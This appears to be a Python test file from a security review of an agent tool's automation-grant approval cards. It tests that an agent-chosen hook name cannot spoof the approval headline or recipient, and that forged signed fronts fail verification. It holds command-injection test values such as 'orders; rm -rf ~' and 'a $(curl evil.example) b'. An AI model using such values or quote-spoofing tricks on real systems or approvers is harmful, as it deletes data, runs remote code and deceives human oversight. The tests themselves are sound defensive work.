"""0304-frozen security implementation review r2: N1 (Agent-chosen hook name inside the grant card headline), N2 (legacy
Same owner notice at serve start, device-less rows named), N3 (the signed v2 front must be the host-built one).
Real Ed25519 + WebAuthn proofs (test_p57 Authenticator), real PeerService over FakeNet. Synthetic @example.com only.
"""
import _hermetic  # noqa: F401,I001
from unittest.mock import patch

from agentj import approvals, approval_review, automation_grant as AG, passkey, wire
from agentj.same_owner import SameOwner
from test_0304_automation_grant import ALLY, Base
from test_0304_security_impl_r1 import Legacy

EVIL = '日报」仅发给 me@example.com；「x'
MARKS = '「」『』"“”\'‘’<>《》【】｢｣〝〞〟❝❞﹁﹂﹃﹄′″`'


def _core(name, kind='hook'):
    return {'id': 'f' * 32, 'host': 'ch', 'target': {'kind': kind, 'id': '_hookid', 'digest': '0123456789abcdef' * 4},
            'name': name, 'actions': ['mail'], 'to': [ALLY], 'domains': [],
            'account': {'address': 'owner@example.com', 'smtp': 'smtp.example.com:465', 'user': 'u' * 16},
            'stop': 0, 'expires': None, 'max_uses': None, 'created': 1, 'lang': 'zh'}


class HookNameN1(Base):
    def test_bracket_closing_name_cannot_rewrite_the_headline(self):
        core = _core(EVIL)
        safe = AG.label(core)
        self.assertFalse(set(safe) & set(MARKS), safe)
        self.assertEqual(safe, '日报 仅发给 me@example.com； x')
        f = AG.front(core)
        # recipients lead; the name only after 「来源」, inside quotes it cannot close
        self.assertTrue(f['reason'].startswith(f'自动发邮件给 {ALLY}（长期有效）· 来源 hook「{safe}」 · '), f['reason'])
        self.assertTrue(f['reason_en'].startswith(f'Mail {ALLY} automatically (no expiry) · from webhook “{safe}” · '),
                        f['reason_en'])
        for text in (f['reason'], f['reason_en']):
            self.assertEqual(text.count('「') + text.count('“'), 1, text)
        zh, en = AG.shown(core), AG.shown({**core, 'lang': 'en'})
        self.assertIn(f'自动化：Webhook「{safe}」（_hookid）', zh)
        self.assertIn(f'Automation: Webhook 「{safe}」 (_hookid)', en)
        self.assertNotIn(EVIL, zh + en)
        self.assertIn(safe, AG._what({'kind': 'hook', 'id': '_hookid', 'name': EVIL}, False))
        # line breaks / invisible characters / long names; an all-marks name falls back to the id
        self.assertEqual(AG.label(_core('a\nb​c‮d')), 'a b c d')
        self.assertEqual(len(AG.label(_core('x' * 300))), 40)
        self.assertEqual(AG.label(_core('「」""')), '_hookid')

    def test_r3_lookalike_quotes_and_combining_marks_are_stripped(self):
        # security r3 R3-1: Unicode categories after NFKC, not a hand list
        for q in ('｢｣', '〝〞', '〝〟', '❝❞', '﹁﹂', '﹃﹄', '′″', '‹›', '„‟', '〃〃'):
            with self.subTest(q=q):
                safe = AG.label(_core(f'日报{q[1]}仅发给 me@example.com；{q[0]}x'))
                self.assertFalse(set(safe) & set(MARKS + q), safe)
                self.assertEqual(safe, '日报 仅发给 me@example.com； x')
        # a combining mark (enclosing circle / overline) cannot dress a letter up as a quote; NFKC-folded too
        self.assertEqual(AG.label(_core('a\u20dd」b\u0305c\u0301')), 'a b c')
        self.assertEqual(AG.label(_core('\u0301\u20dd\u3000')), '_hookid')
        self.assertEqual(AG.label(_core('日报 Daily-1')), '日报 Daily-1')     # plain words unchanged
        self.assertEqual(len(AG.label(_core('「' * 10 + 'x' * 300))), 40)

    def test_r3_extend_command_uses_the_hook_id_not_the_name(self):
        for name in ('orders; rm -rf ~', 'a $(curl evil.example) b', 'x`id`', 'two words'):
            with self.subTest(name=name):
                for hid in ('-AbC_123', 'abc'):
                    cmd = AG._extend_cmd({'kind': 'hook', 'id': hid, 'name': name}, None, ['b@example.com'])
                    self.assertEqual(cmd, f'agentj automation grant --hook={hid} --to b@example.com')
                    self.assertNotIn(name, cmd)
        odd = AG._extend_cmd({'kind': 'hook', 'id': "a b;$(x)'", 'name': 'n'}, None, ['b@example.com'])
        import shlex
        self.assertEqual(shlex.split(odd)[3], "--hook=a b;$(x)'")     # not a valid id: still one quoted, inert word

    async def test_r3_cli_accepts_the_hook_id_from_the_refusal(self):
        self.hook2['name'] = 'other; echo $(id)'
        res = AG.refusal('automation_grant_required', {'kind': 'hook', 'id': self.hook2['id'], 'name': self.hook2['name']},
                         'zh', missing=[ALLY])
        self.assertNotIn('$(id)', str(res))
        self.assertIn(f"--hook={self.hook2['id']}", str(res))
        # the id the refusal names is accepted by the host (store.find matches an id first) …
        g = await self.grant(ref=self.hook2['id'])
        self.assertTrue(g['ok'], g)
        # … and by the CLI parser even when the id starts with '-' (hooks.new_id is url-safe base64)
        import contextlib
        import io
        from agentj import cli
        seen = []

        def fake(st, req, timeout=None, **kw):
            seen.append(req)
            return {'ok': True, 'items': []}
        with patch('agentj.elevate.client_request', side_effect=fake), contextlib.redirect_stdout(io.StringIO()):
            cli.main(['automation', 'grant', '--hook=-AbC_123', '--to', ALLY, '--json'])
        self.assertEqual(seen[0]['ref'], '-AbC_123')

    async def test_evil_name_grant_signed_and_verified_with_the_safe_text(self):
        self.hook['name'] = EVIL
        g = await self.grant(ref=self.hook['id'])
        card = self.cards[0]
        self.assertNotIn(EVIL, card)
        self.assertIn('「' + AG.label({'name': EVIL, 'id': 'x'}) + '」', card)
        row = self.ledger()['grants'][g['grant']]
        self.assertTrue(AG.proof_ok(self.st, row['core'], row['proof']), 'proof_ok rebuilds the same sanitized text')


class FrontN3(Base):
    """A v2 proof: the signed envelope's title / reason must equal front(core) — a mismatch is invalid."""

    def v2(self, core, **env_over):
        summary, channel, rid = AG.shown(core), self.st.config()['channel'], 'request-id'
        env = {'v': 2, 'channel': channel, 'request_id': rid, 'action': AG.TOOL,
               'details': approval_review.safe_text(summary, 24000),
               'input_sha256': approvals.input_digest({'summary': summary}), 'plan': None}
        for k, n in (('title', 160), ('title_en', 160), ('reason', 600), ('reason_en', 600)):
            env[k] = approval_review.safe_text(AG.front(core)[k], n)
        env.update(env_over)
        env = {k: v for k, v in env.items() if v is not None or k == 'plan'}
        d = approval_review.digest(env)
        msg = approvals.signed_message(channel, 'dev1', rid, 'allow', d).replace(
            (approvals.CONTEXT + '\n').encode(), (approval_review.CONTEXT + '\n').encode(), 1)
        fa = self.auth.assert_(passkey.elevate_challenge(channel, 'dev1', rid, 'sandbox', rid, d), b'', nonce=b'')
        return {'device': 'dev1', 'rid': rid, 'channel': channel, 'summary': summary, 'kind': 'sandbox',
                'sig': wire.b64u(self.ed.sign(msg)), 'fa': {k: fa[k] for k in ('id', 'cd', 'ad', 'sig')},
                'approval_v': 2, 'envelope': env}

    def test_signed_front_must_match_the_core(self):
        core = {**_core('orders'), 'host': self.st.config()['channel']}
        self.assertTrue(AG.proof_ok(self.st, core, self.v2(core)), 'control: the host-built front verifies')
        forged = {'reason': '自动发邮件给 boss@example.com（长期有效）', 'reason_en': 'Mail nobody',
                  'title': '查看日报', 'title_en': 'Read the report'}
        for key, value in forged.items():
            with self.subTest(key=key):
                self.assertFalse(AG.proof_ok(self.st, core, self.v2(core, **{key: value})))
        with self.subTest('no front at all'):
            self.assertFalse(AG.proof_ok(self.st, core, self.v2(core, title=None, title_en=None, reason=None,
                                                                 reason_en=None)))


class LegacyAtStartN2(Legacy):
    async def restart(self):
        await self.A.svc.stop()
        await self.A.svc.start()

    async def test_serve_start_lists_legacy_relations_once_with_deviceless_named(self):
        await self.legacy()
        so = self.A.svc.same_owner
        await self.restart()                                  # no passkey anywhere: nothing to say, nothing marked
        self.assertEqual(self.notices['A'], [])
        self.assertFalse(self.A.svc.store._read('same-owner-meta.json', {}).get('legacy_noticed'))
        with so.svc.store._edit('same-owner.json', {}) as rows:   # a row from before init/proof devices were recorded
            r = rows[self.B.id]
            for k in ('init', 'proof'):
                if isinstance(r.get(k), dict):
                    r[k].pop('device', None)
        name = self.A.svc.store.name_of(self.B.id)
        self.assertEqual(so.legacy_deviceless(), [name])
        with patch.object(SameOwner, 'uv_host', return_value=True):   # upgraded with a passkey already in place
            await self.restart()
            self.assertEqual(len(self.notices['A']), 1, self.notices['A'])
            text = self.notices['A'][0]
            self.assertIn(f'「{name}」', text)
            self.assertIn('旧式', text)
            self.assertIn('移除遥控器也不会自动解除', text)
            self.assertTrue(self.A.svc.store._read('same-owner-meta.json', {}).get('legacy_noticed'))
            await self.restart()                              # once per host
            self.assertEqual(len(self.notices['A']), 1)
        self.assertTrue(so.active(self.B.id) or self.A.svc.same_owner.active(self.B.id), 'listed, not ended')
